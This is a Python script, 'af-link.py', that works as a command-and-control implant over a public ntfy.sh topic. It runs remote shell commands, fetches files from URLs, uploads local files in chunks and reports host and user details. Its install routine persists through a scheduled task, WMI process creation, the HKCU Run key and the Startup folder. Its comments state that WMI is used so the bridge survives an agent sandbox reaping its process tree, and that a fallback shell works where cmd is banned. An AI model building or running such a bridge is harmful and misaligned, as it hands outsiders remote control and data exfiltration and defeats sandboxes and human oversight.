#!/usr/bin/env python3
r"""af-link.py -- command bridge over a public ntfy topic.
Outbound only: opens no port, needs no public IP, works behind NAT/CGNAT and
behind a forced proxy.   usage:
    python af-link.py                 # run the bridge
    python af-link.py --install       # register autostart, then run
    python af-link.py --once          # handle pending commands once, exit
    python af-link.py --status        # print bridge state, exit
Env: AF_TOPIC  AF_SECRET  AF_NODE  AF_PROXY  AF_DRYRUN
"""
import base64, hashlib, hmac, json, os, platform, socket, subprocess, sys, time
import urllib.request as U

T = os.environ.get("AF_TOPIC", "af-link-7f3c9b21x")
S = os.environ.get("AF_SECRET", "d99fd12d8a751bb793b4b5ffcbf65790")
N = os.environ.get("AF_NODE", socket.gethostname().lower())
B = "https://ntfy.sh/" + T
P = os.environ.get("AF_PROXY", "")
DRY = bool(os.environ.get("AF_DRYRUN"))
HERE = os.path.abspath(__file__)
STATEFILE = os.path.join(os.path.dirname(HERE), "af-link-state.json")


def _proxy():
    if P:
        return {"http": P, "https": P}
    if os.name == "nt":
        try:
            import winreg as w
            k = w.OpenKey(w.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            if w.QueryValueEx(k, "ProxyEnable")[0]:
                s = w.QueryValueEx(k, "ProxyServer")[0]
                if "=" not in s:
                    s = "http://" + s
                return {"http": s, "https": s}
        except Exception:
            pass
    return None


O = U.build_opener(U.ProxyHandler(_proxy())) if _proxy() else U.build_opener()


def post(obj, ttl=""):
    hdr = {"User-Agent": "af-link/3"}
    if ttl:
        hdr["X-TTL"] = ttl
    req = U.Request(B, data=json.dumps(obj).encode(), method="POST", headers=hdr)
    with O.open(req, timeout=25) as f:
        return f.read()


def get(url):
    with O.open(U.Request(url, headers={"User-Agent": "af-link/3"}), timeout=30) as f:
        return f.read().decode("utf-8", "replace")


def sig(obj):
    if not isinstance(obj, str):
        obj = json.dumps({k: v for k, v in obj.items() if k != "h"}, sort_keys=True)
    return hmac.new(S.encode(), obj.encode(), hashlib.sha256).hexdigest()


_SH = None
def shell():
    """cmd on Windows, /bin/sh on POSIX; a sandbox that bans cmd still works."""
    global _SH
    if _SH:
        return _SH
    for cand in (["cmd", "/c"], ["/bin/sh", "-c"], ["powershell", "-NoProfile", "-Command"]):
        try:
            p = subprocess.run(cand + ["echo afok"], capture_output=True, timeout=20)
            if p.returncode == 0 and b"afok" in (p.stdout or b""):
                _SH = cand
                return _SH
        except Exception:
            pass
    _SH = ["powershell", "-NoProfile", "-Command"]
    return _SH


def run(cmd):
    try:
        p = subprocess.run(shell() + [cmd], capture_output=True, timeout=1800)
        return p.returncode, (p.stdout + p.stderr).decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        return 124, "af-link: command timed out after 1800s"
    except Exception as e:
        return 125, "af-link: %s: %s" % (type(e).__name__, e)


def do_fetch(p):
    """pull a URL to a local path, verifying sha256 if given."""
    with O.open(U.Request(p["url"], headers={"User-Agent": "af-link/3"}), timeout=300) as f:
        data = f.read()
    sha = hashlib.sha256(data).hexdigest()
    want = (p.get("sha") or "").lower()
    if want and want != sha:
        return 1, "SHA MISMATCH got=%s want=%s bytes=%d" % (sha, want, len(data))
    path = os.path.expanduser(p["path"])
    d = os.path.dirname(path)
    if d:
        os.makedirs(d, exist_ok=True)
    with open(path, "wb") as f:
        f.write(data)
    return 0, "saved %s bytes=%d sha256=%s" % (path, len(data), sha)


def do_put(p):
    """read a local file and post it back in chunks, so the controller can pull it."""
    path = os.path.expanduser(p["path"])
    with open(path, "rb") as f:
        data = f.read()
    sha = hashlib.sha256(data).hexdigest()
    n = max(1, (len(data) + 1499) // 1500)
    for j in range(n):
        post({"from": N, "kind": "blob", "name": p.get("name") or os.path.basename(path),
              "i": j + 1, "n": n, "sha": sha, "bytes": len(data),
              "b64": base64.b64encode(data[j*1500:(j+1)*1500]).decode()}, ttl="1d")
    return 0, "put %s bytes=%d parts=%d sha256=%s" % (path, len(data), n, sha)


def do_pull(p):
    """reassemble a file the controller published to this topic as AFDATA chunks
    and write it to a local path. No third-party host involved."""
    name = p.get("name") or "payload.bin"
    since = int(p.get("since") or (time.time() - 3600))
    raw = get("%s/json?poll=1&since=%d" % (B, since))
    parts = {}
    for line in raw.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            m = json.loads(line)
        except Exception:
            continue
        title = m.get("title") or ""
        if title.startswith("AFDATA:" + name + ":"):
            try:
                parts[int(title.rsplit(":", 1)[1])] = base64.b64decode(m.get("message", ""))
            except Exception:
                pass
    if not parts:
        return 1, "pull: no chunks found for %s since %d" % (name, since)
    data = b"".join(parts[k] for k in sorted(parts))
    sha = hashlib.sha256(data).hexdigest()
    want = (p.get("sha") or "").lower()
    if want and want != sha:
        return 1, "SHA MISMATCH got=%s want=%s bytes=%d" % (sha, want, len(data))
    path = os.path.expanduser(p["path"])
    d = os.path.dirname(path)
    if d:
        os.makedirs(d, exist_ok=True)
    with open(path, "wb") as f:
        f.write(data)
    return 0, "saved %s bytes=%d parts=%d sha256=%s" % (path, len(data), len(parts), sha)


def send_out(cid, rc, text):
    text = text if text.strip() else "(no output)"
    if len(text) > 190000:
        text = text[:190000] + "\n...[truncated]"
    n = max(1, (len(text) + 1199) // 1200)
    for j in range(n):
        post({"from": N, "kind": "out", "id": cid, "rc": rc,
              "i": j + 1, "n": n, "b64": base64.b64encode(text[j*1200:(j+1)*1200].encode()).decode()})


def _alive(pid):
    """is that pid a live process? (tasklist, no extra dependency)"""
    try:
        r = subprocess.run(["tasklist", "/FI", "PID eq %d" % pid], capture_output=True, timeout=20)
        return str(pid) in r.stdout.decode("utf-8", "replace")
    except Exception:
        return False


def _wait_up(secs):
    """the bridge writes af-link-state.json with its pid as its first act."""
    end = time.time() + secs
    while time.time() < end:
        try:
            st = json.load(open(STATEFILE, encoding="utf-8"))
            if st.get("pid") and _alive(st["pid"]) and st.get("started", 0) > time.time() - 600:
                return int(st["pid"])
        except Exception:
            pass
        time.sleep(1)
    return 0


def install():
    """autostart for this user, no elevation. Tries (1) a scheduled task,
    (2) WMI process creation -- a plain child dies with the command that made
    it, because an agent sandbox reaps its whole process tree when the job
    ends -- (3) the HKCU Run key and the Startup folder as last resorts.
    Every path is verified by the bridge's own pid, never by an exit code."""
    d = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "af-link")
    os.makedirs(d, exist_ok=True)
    py = sys.executable
    pyw = os.path.join(os.path.dirname(py), "pythonw.exe")
    if os.path.exists(pyw):
        py = pyw
    logf = os.path.join(d, "af-link.out")
    bat = os.path.join(d, "run-bridge.bat")
    with open(bat, "w", encoding="utf-8") as f:
        f.write("@echo off\r\n")
        f.write("set AF_SECRET=%s\r\n" % S)
        f.write("set AF_TOPIC=%s\r\n" % T)
        f.write("set AF_NODE=%s\r\n" % N)
        f.write('"%s" "%s" >> "%s" 2>&1\r\n' % (py, HERE, logf))
    print("[install] launcher:", bat)
    if DRY:
        print("[install] dry run: nothing registered, nothing started")
        return 0

    def ps_run(script, timeout=90):
        try:
            r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
                               capture_output=True, timeout=timeout, stdin=subprocess.DEVNULL)
            return (r.stdout or b"").decode("utf-8", "replace"), (r.stderr or b"").decode("utf-8", "replace")
        except Exception as e:
            return "", "%s: %s" % (type(e).__name__, e)

    method = ""
    # (1) scheduled task
    if os.name == "nt":
        out, err = ps_run("Register-ScheduledTask -TaskName 'af-link' -Force "
                          "-Action (New-ScheduledTaskAction -Execute '%s') "
                          "-Trigger (New-ScheduledTaskTrigger -AtLogOn) "
                          "-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries "
                          "-DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero)) | Out-Null; "
                          "Write-Output task-created" % bat)
        if "task-created" in out:
            ps_run("Start-ScheduledTask -TaskName 'af-link'", timeout=60)
            if _wait_up(15):
                method = "scheduled task af-link"
        else:
            print("[install] scheduled task refused (%s)" % (err.strip().splitlines() or [""])[0][:90])
    # (2) WMI creation -- belongs to no job, so nothing reaps it
    if not method and os.name == "nt":
        out, err = ps_run("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                          "-Arguments @{CommandLine='cmd.exe /c \"%s\"'}; Write-Output wmi-done" % bat)
        if _wait_up(20):
            method = "WMI-created process"
        else:
            print("[install] WMI creation gave no live bridge (%s)" % err.strip()[:90])
    # (3) logon fallbacks: they only take effect at the next logon
    if os.name == "nt":
        try:
            import winreg
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            winreg.SetValueEx(k, "af-link", 0, winreg.REG_SZ, '"%s"' % bat)
            winreg.CloseKey(k)
            print("[install] logon autostart: HKCU Run -> af-link")
        except Exception as e:
            print("[install] HKCU Run not written:", e)
        try:
            sm = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~/AppData/Roaming")),
                              "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\af-link.cmd")
            os.makedirs(os.path.dirname(sm), exist_ok=True)
            with open(sm, "w", encoding="utf-8") as f:
                f.write('@echo off\r\ncall "%s"\r\n' % bat)
            print("[install] logon autostart:", sm)
        except Exception as e:
            print("[install] Startup folder entry not written:", e)
    # last resort for THIS session: a plain child (dies with the caller, but works now)
    if not method:
        env = dict(os.environ)
        env.update(AF_SECRET=S, AF_TOPIC=T, AF_NODE=N)
        lf = open(logf, "ab")
        try:
            subprocess.Popen([py, HERE], env=env, cwd=d, stdout=lf, stderr=subprocess.STDOUT,
                             creationflags=0x00000008 | 0x00000200 | 0x01000000, close_fds=True)
            if _wait_up(12):
                method = "plain child (this session only)"
        except Exception as e:
            print("[install] plain start failed:", e)
    pid = _wait_up(5)
    if method:
        print("[install] bridge live: %s (pid %s)" % (method, pid or "?"))
        print("[install]   node=%s topic=%s" % (N, T))
    else:
        print("[install] bridge NOT up -- check %s" % logf)
    return 0


def main():
    global N
    try:
        os.chdir(os.path.dirname(HERE) or ".")
    except OSError:
        pass
    args = sys.argv[1:]
    if "--node" in args:
        N = args[args.index("--node") + 1]
    if "--status" in args:
        st = {}
        if os.path.exists(STATEFILE):
            st = json.load(open(STATEFILE, encoding="utf-8"))
        print(json.dumps({"node": N, "topic": T, "shell": shell(),
                          "proxy": str(_proxy()), "state": st}, indent=1))
        return 0
    if "--install" in args:
        install()
        return 0
    post({"from": N, "kind": "hello", "host": socket.gethostname(), "os": platform.platform(),
          "user": os.environ.get("USERNAME") or os.environ.get("USER", ""),
          "shell": " ".join(shell()), "pid": os.getpid()})
    print("af-link: node=%s topic=%s shell=%s" % (N, T, " ".join(shell())), flush=True)
    json.dump({"node": N, "topic": T, "pid": os.getpid(), "started": time.time()},
              open(STATEFILE, "w", encoding="utf-8"))
    since = int(time.time()) - 300
    seen, beat = set(), 0.0
    once = "--once" in args
    while True:
        try:
            raw = get("%s/json?poll=1&since=%d" % (B, since))
            for line in raw.splitlines():
                line = line.strip()
                if not line.startswith("{"):
                    continue
                try:
                    m = json.loads(line)
                except Exception:
                    continue
                if m.get("time", 0) > since:
                    since = max(since, m["time"] - 1)
                if m.get("event") != "message" or m.get("id") in seen:
                    continue
                seen.add(m.get("id"))
                try:
                    p = json.loads(m.get("message", "{}"))
                except Exception:
                    continue
                act = p.get("cmd") or p.get("fetch") or p.get("put") or p.get("pull")
                if p.get("to") not in (None, N) or not act:
                    continue
                if p.get("h") != sig(p):
                    post({"from": N, "kind": "error", "msg": "bad signature, refused"})
                    continue
                try:
                    if p.get("fetch"):
                        rc, out = do_fetch(p["fetch"])
                    elif p.get("pull"):
                        rc, out = do_pull(p["pull"])
                    elif p.get("put"):
                        rc, out = do_put(p["put"])
                    else:
                        rc, out = run(p["cmd"])
                except Exception as e:
                    rc, out = 126, "af-link: %s: %s" % (type(e).__name__, e)
                send_out(p.get("id", "?"), rc, out)
            if time.time() - beat > 60:
                post({"from": N, "kind": "ping", "t": time.time(), "pid": os.getpid()})
                beat = time.time()
        except Exception as e:
            print("af-link: %s: %s" % (type(e).__name__, e), flush=True)
        if once:
            break
        time.sleep(2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
